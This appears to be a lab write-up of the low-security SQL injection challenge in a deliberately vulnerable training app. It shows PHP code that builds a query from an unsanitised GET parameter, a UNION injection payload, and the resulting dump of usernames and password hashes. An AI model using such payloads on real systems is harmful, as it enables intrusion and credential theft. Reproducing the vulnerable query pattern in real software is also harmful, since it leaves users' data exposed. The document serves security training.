# SQL Injection

Despite being a very well understood class of attack, SQL injection vulnerabilities are still alarmingly common.

## Low

The relevant chunk from the source code of the low security SQLi challenge:

```php
<?php    
$id = $_GET['id'];

$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );
?>
```

With no sanitisation on the value, it's pretty clear that `$id` is our point of injection.

The first thing I want to do is get some information. We know for free that there's a table called `users` containing the columns `user_id`, `first_name` and `last_name`.

We can try to find out some other column names, but we can at least guess that there might be a `user` or `password` field. The original query selects values from two columns, so we can use a `UNION` statement in our injection to extract values from two additional columns.

```
1' UNION SELECT user, password FROM users;#
```

What luck! As hoped, the application spits out the following:

```
ID: 1' UNION SELECT user, password FROM users;#
First name: admin
Surname: admin

ID: 1' UNION SELECT user, password FROM users;#
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

ID: 1' UNION SELECT user, password FROM users;#
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: 1' UNION SELECT user, password FROM users;#
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: 1' UNION SELECT user, password FROM users;#
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: 1' UNION SELECT user, password FROM users;#
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

So now we have a set of usernames and password hashes.

```
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
```

